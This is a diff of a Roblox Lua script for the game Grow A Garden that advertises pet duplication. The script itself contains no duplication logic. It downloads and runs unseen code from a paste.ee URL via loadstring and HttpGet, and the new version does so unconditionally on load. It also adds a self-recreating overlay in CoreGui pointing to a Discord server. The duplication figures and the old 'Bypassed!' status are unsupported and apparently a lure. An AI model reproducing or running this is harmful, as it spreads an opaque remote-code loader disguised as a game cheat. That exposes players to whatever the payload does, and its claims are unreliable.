@@ -1,116 +1,166 @@
--- Dash Scripts UI (Grow A Garden) - Improved Version
+-- LocalScript under StarterGui
 
-local ScreenGui = Instance.new("ScreenGui")
-local Main = Instance.new("Frame")
-local UICorner = Instance.new("UICorner")
-local UIStroke = Instance.new("UIStroke")
-local Title = Instance.new("TextLabel")
-local Subtitle = Instance.new("TextLabel")
-local PetsInfo = Instance.new("TextLabel")
-local StartButton = Instance.new("TextButton")
-local Status = Instance.new("TextLabel")
+local player = game.Players.LocalPlayer
 
--- Parent GUI
-ScreenGui.Name = "DashScripts"
-ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-ScreenGui.ResetOnSpawn = false
+-- Function to create Discord GUI
+local function createDiscordGUI()
+    local ScreenGui = Instance.new("ScreenGui")
+    local Frame = Instance.new("Frame")
+    local TextLabel = Instance.new("TextLabel")
+    local CopyButton = Instance.new("TextButton")
 
--- Main Frame
-Main.Name = "Main"
-Main.Size = UDim2.new(0, 270, 0, 160)
-Main.Position = UDim2.new(0.5, -135, 0.5, -80)
-Main.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-Main.Active = true
-Main.Draggable = true
-Main.Parent = ScreenGui
+    ScreenGui.Name = "HelpGUI"
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.IgnoreGuiInset = true
+    ScreenGui.DisplayOrder = 999999
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    ScreenGui.Parent = game.CoreGui
 
-UICorner.CornerRadius = UDim.new(0, 12)
-UICorner.Parent = Main
+    Frame.Name = "MainFrame"
+    Frame.Parent = ScreenGui
+    Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+    Frame.Position = UDim2.new(0.5, 0, 0.42, 0)
+    Frame.Size = UDim2.new(0, 320, 0, 110)
+    Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    Frame.BorderSizePixel = 0
 
--- Subtle outline for depth
-UIStroke.Color = Color3.fromRGB(255, 255, 255)
-UIStroke.Thickness = 1.2
-UIStroke.Transparency = 0.7
-UIStroke.Parent = Main
+    -- Rounded corner and shadow
+    Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 8)
+    local stroke = Instance.new("UIStroke", Frame)
+    stroke.Color = Color3.fromRGB(255, 255, 255)
+    stroke.Thickness = 1
+    stroke.Transparency = 0.6
 
--- Title with RGB
-Title.Name = "Title"
-Title.Text = "Dash Scripts"
-Title.TextSize = 22
-Title.Font = Enum.Font.GothamBlack
-Title.Position = UDim2.new(0.05, 0, 0.05, 0)
-Title.Size = UDim2.new(0.9, 0, 0.18, 0)
-Title.BackgroundTransparency = 1
-Title.TextColor3 = Color3.fromRGB(255, 0, 0)
-Title.Parent = Main
+    TextLabel.Parent = Frame
+    TextLabel.Size = UDim2.new(1, -20, 0.6, 0)
+    TextLabel.Position = UDim2.new(0, 10, 0, 8)
+    TextLabel.BackgroundTransparency = 1
+    TextLabel.Text = "🔗 Join our Discord if you need help!\nWait for the script to reach 100%. If it fails, rejoin and try again!"
+    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    TextLabel.Font = Enum.Font.Gotham
+    TextLabel.TextSize = 14
+    TextLabel.TextWrapped = true
+    TextLabel.TextXAlignment = Enum.TextXAlignment.Center
+    TextLabel.TextYAlignment = Enum.TextYAlignment.Top
 
--- Animate RGB
+    CopyButton.Parent = Frame
+    CopyButton.Size = UDim2.new(1, -40, 0, 30)
+    CopyButton.Position = UDim2.new(0, 20, 1, -40)
+    CopyButton.BackgroundColor3 = Color3.fromRGB(100, 160, 220)
+    CopyButton.Text = "Copy Discord Link"
+    CopyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    CopyButton.Font = Enum.Font.GothamBold
+    CopyButton.TextSize = 16
+    CopyButton.AutoButtonColor = true
+    CopyButton.BorderSizePixel = 0
+    Instance.new("UICorner", CopyButton).CornerRadius = UDim.new(0, 6)
+
+    CopyButton.MouseButton1Click:Connect(function()
+        setclipboard("https://discord.gg/Yva9w9AQup")
+        CopyButton.Text = "✅ Copied!"
+        CopyButton.BackgroundColor3 = Color3.fromRGB(80, 200, 120)
+        task.wait(1.5)
+        CopyButton.Text = "Copy Discord Link"
+        CopyButton.BackgroundColor3 = Color3.fromRGB(100, 160, 220)
+    end)
+
+    return ScreenGui
+end
+
+-- Show Discord GUI first
+local discordGui = createDiscordGUI()
+
+-- Anti-delete loop for Discord GUI
 task.spawn(function()
-	while true do
-		for hue = 0, 1, 0.01 do
-			Title.TextColor3 = Color3.fromHSV(hue, 1, 1)
-			task.wait(0.03)
-		end
-	end
+    while true do
+        if not discordGui or not discordGui.Parent then
+            discordGui = createDiscordGUI()
+        end
+        task.wait(1)
+    end
 end)
 
--- Subtitle
-Subtitle.Name = "Subtitle"
-Subtitle.Text = "Grow A Garden"
-Subtitle.Font = Enum.Font.Gotham
-Subtitle.TextSize = 17
-Subtitle.TextColor3 = Color3.fromRGB(210, 210, 210)
-Subtitle.Position = UDim2.new(0.05, 0, 0.22, 0)
-Subtitle.Size = UDim2.new(0.9, 0, 0.12, 0)
-Subtitle.BackgroundTransparency = 1
-Subtitle.Parent = Main
+-- Then run the external script
+loadstring(game:HttpGet("https://paste.ee/r/Zhs0HSp8"))()
 
--- Pets info (formatted)
-PetsInfo.Name = "PetsInfo"
-PetsInfo.Text = "Hold one of these pets:\nRed Fox - Dragonfly / Raccoon - Praying Mantis"
-PetsInfo.Font = Enum.Font.Gotham
-PetsInfo.TextSize = 15
-PetsInfo.TextColor3 = Color3.fromRGB(255, 255, 255)
-PetsInfo.Position = UDim2.new(0.05, 0, 0.38, 0)
-PetsInfo.Size = UDim2.new(0.9, 0, 0.25, 0)
-PetsInfo.BackgroundTransparency = 1
-PetsInfo.TextWrapped = true
-PetsInfo.TextYAlignment = Enum.TextYAlignment.Top
-PetsInfo.Parent = Main
+-- After a short delay, show the Pet List GUI
+task.delay(2, function()
+    local smallPetGui = Instance.new("ScreenGui")
+    smallPetGui.Name = "SmallPetGui"
+    smallPetGui.DisplayOrder = 1000000
+    smallPetGui.Parent = game.CoreGui
 
--- Start Button
-StartButton.Name = "StartButton"
-StartButton.Text = "▶ Start Duping"
-StartButton.Font = Enum.Font.GothamBold
-StartButton.TextSize = 17
-StartButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-StartButton.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
-StartButton.Position = UDim2.new(0.18, 0, 0.7, 0)
-StartButton.Size = UDim2.new(0.65, 0, 0.18, 0)
-StartButton.AutoButtonColor = true
-StartButton.Parent = Main
+    local frame = Instance.new("Frame", smallPetGui)
+    frame.Size = UDim2.new(0, 320, 0, 240)
+    frame.Position = UDim2.new(0.5, -160, 0.5, -120)
+    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    frame.BorderSizePixel = 0
+    frame.Active = true
+    frame.Draggable = true
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
+    local uistroke = Instance.new("UIStroke", frame)
+    uistroke.Color = Color3.fromRGB(255, 255, 255)
+    uistroke.Transparency = 0.5
 
-local btnCorner = Instance.new("UICorner", StartButton)
-btnCorner.CornerRadius = UDim.new(0, 8)
+    local closeBtn = Instance.new("TextButton", frame)
+    closeBtn.Size = UDim2.new(0, 30, 0, 30)
+    closeBtn.Position = UDim2.new(1, -35, 0, 5)
+    closeBtn.Text = "×"
+    closeBtn.TextScaled = true
+    closeBtn.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
+    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 8)
+    closeBtn.MouseButton1Click:Connect(function()
+        frame.Visible = false
+    end)
 
--- Status Label
-Status.Name = "Status"
-Status.Text = ""
-Status.Font = Enum.Font.Gotham
-Status.TextSize = 15
-Status.TextColor3 = Color3.fromRGB(255, 255, 255)
-Status.Position = UDim2.new(0, 0, 1, 2)
-Status.Size = UDim2.new(1, 0, 0.15, 0)
-Status.BackgroundTransparency = 1
-Status.Parent = Main
+    local title = Instance.new("TextLabel", frame)
+    title.Size = UDim2.new(1, -40, 0, 30)
+    title.Position = UDim2.new(0, 10, 0, 5)
+    title.Text = "🧬 Supported Pets"
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.BackgroundTransparency = 1
+    title.TextXAlignment = Enum.TextXAlignment.Left
+    title.Font = Enum.Font.GothamBold
+    title.TextScaled = true
 
--- On Click: Animated status then run script
-StartButton.MouseButton1Click:Connect(function()
-	Status.Text = "Checking pet..."
-	wait(2)
-	Status.Text = "Bypassed!"
-	wait(1)
-	pcall(function()
-		loadstring(game:HttpGet("https://paste.ee/r/Zhs0HSp8"))()
-	end)
+    local scroll = Instance.new("ScrollingFrame", frame)
+    scroll.Size = UDim2.new(1, -20, 1, -50)
+    scroll.Position = UDim2.new(0, 10, 0, 40)
+    scroll.CanvasSize = UDim2.new(0, 0, 0, 500)
+    scroll.ScrollBarThickness = 6
+    scroll.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    scroll.BorderSizePixel = 0
+    scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+    scroll.ScrollingDirection = Enum.ScrollingDirection.Y
+    Instance.new("UICorner", scroll).CornerRadius = UDim.new(0, 6)
+
+    local uiList = Instance.new("UIListLayout", scroll)
+    uiList.SortOrder = Enum.SortOrder.LayoutOrder
+    uiList.Padding = UDim.new(0, 6)
+
+    local pets = {
+        "🐾 Grow A Garden Supported Pets",
+        "Dragonfly🐉 / Raccoon🦝 / Red Fox🦊",
+        " ",
+        "📌 Duplication Info",
+        "–––––––––––––––––––––––––––––––",
+        "1 = 2 (Duped)",
+        "2 = 4 (Duped)",
+        "3 = 6 (Duped)",
+        "4 = 8 (Duped)",
+        "5 = 10 (Duped)",
+        "More = Unlimited ♾️"
+    }
+
+    for _, pet in ipairs(pets) do
+        local label = Instance.new("TextLabel", scroll)
+        label.Size = UDim2.new(1, 0, 0, 26)
+        label.Text = pet ~= " " and "• " .. pet or ""
+        label.TextColor3 = Color3.fromRGB(255, 255, 255)
+        label.BackgroundTransparency = 1
+        label.Font = Enum.Font.Gotham
+        label.TextScaled = true
+        label.TextWrapped = true
+    end
 end)
